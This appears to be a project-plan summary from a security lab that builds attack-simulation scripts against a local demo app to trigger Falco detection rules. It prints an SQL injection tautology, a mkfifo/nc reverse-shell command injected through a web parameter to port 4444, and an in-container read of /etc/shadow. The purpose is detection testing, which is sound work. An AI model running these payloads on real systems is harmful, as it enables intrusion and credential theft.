---
phase: 05-runtime-security
plan: 05-attack-scripts
subsystem: testing
tags: [attacks, sqli, reverse-shell, privilege-escalation, falco, ethical-hacking]

requires:
  - phase: 04-jenkins-ci
    provides: demoapp running on NodePort 30080 in demoapp namespace

provides:
  - attacks/sqli.py — SQL injection PoC (ATK-01), stdlib only, exits 0 on confirmed injection
  - attacks/reverse_shell.sh — cmd-injection reverse shell trigger (ATK-02), fires Falco reverse-shell + shell-from-webapp rules
  - attacks/privilege_probe.sh — in-container sensitive-file/pkg-mgmt probe (ATK-03), fires Falco read-sensitive-file + package-management rules

affects: [05-integration-verify]

tech-stack:
  added: [python3 urllib (stdlib), bash, kubectl exec]
  patterns: [ATK-04 ethical guard pattern, busybox-safe mkfifo reverse shell, non-interactive kubectl exec for Falco triggering]

key-files:
  created:
    - attacks/sqli.py
    - attacks/reverse_shell.sh
    - attacks/privilege_probe.sh

key-decisions:
  - "ATK-04 guard in all scripts: assert_local_target() / case statement refusing non-local targets"
  - "sqli.py uses stdlib urllib only — no pip install needed under Git Bash/WSL"
  - "reverse_shell.sh uses mkfifo payload (busybox-safe: no bash, no nc -e, no /dev/tcp on node:alpine)"
  - "Reverse-shell detection fires on process spawn — not on fd.sip — so fires even if listener absent"
  - "privilege_probe.sh exec is non-interactive (no -it flag) — tty=0 is what triggers Falco (tty attack vs legitimate debug)"

patterns-established:
  - "ATK-04 pattern: hardcode TARGET=localhost/cluster, validate with allowlist, exit 1 on mismatch"
  - "Double-purpose scripts: each script is also the executable ATK acceptance test for verify-phase5.sh"
  - "Best-effort probe: privilege_probe.sh exits 0 even if apk fails — execve still fired the Falco rule"

requirements-completed: [ATK-01, ATK-02, ATK-03, ATK-04]

duration: ~20min
completed: 2026-08-28
---

# Phase 05 Plan attack-scripts Summary

**Three attack simulation scripts targeting localhost/cluster: SQLi PoC, busybox-safe reverse-shell trigger, and in-container privilege probe — all with ATK-04 ethical guards and designed to fire named Falco rules.**

## Accomplishments

- `attacks/sqli.py`: GET `/sqli?user=' OR '1'='1` tautology against localhost:30080; detects injection via HTTP 200 + results array OR HTTP 500 + error/query in response body; stdlib urllib only; exits 0 on confirmed injection
- `attacks/reverse_shell.sh`: injects `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc host.rancher-desktop.internal 4444 > /tmp/f` via `/cmd?input=`; fires "Reverse Shell Tool" + "Shell Spawned by Web App" Falco rules on process spawn regardless of socket connectivity
- `attacks/privilege_probe.sh`: `kubectl exec -n demoapp` (non-interactive, no `-it`) running `cat /etc/shadow; apk add curl`; fires "Read Sensitive File in demoapp" + "Package Management in demoapp" Falco rules

## Issues / Deviations

None — all tasks completed as planned. busybox constraints correctly handled with mkfifo payload.
